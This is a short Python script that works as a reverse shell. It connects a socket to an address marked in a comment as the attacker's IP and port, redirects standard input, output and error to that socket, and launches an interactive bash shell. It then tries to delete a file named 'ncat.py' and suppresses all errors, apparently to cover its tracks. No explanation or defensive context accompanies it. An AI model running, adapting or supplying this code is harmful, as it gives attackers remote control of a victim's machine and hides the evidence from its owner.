import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# set attacker ip and port 
s.connect(("0.0.0.0", 8080))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

p = subprocess.call(["/bin/bash", "-i"])



file_to_delete = "ncat.py"

try:
    os.remove(file_to_delete)
except FileNotFoundError:
    pass
except Exception as e:
    pass
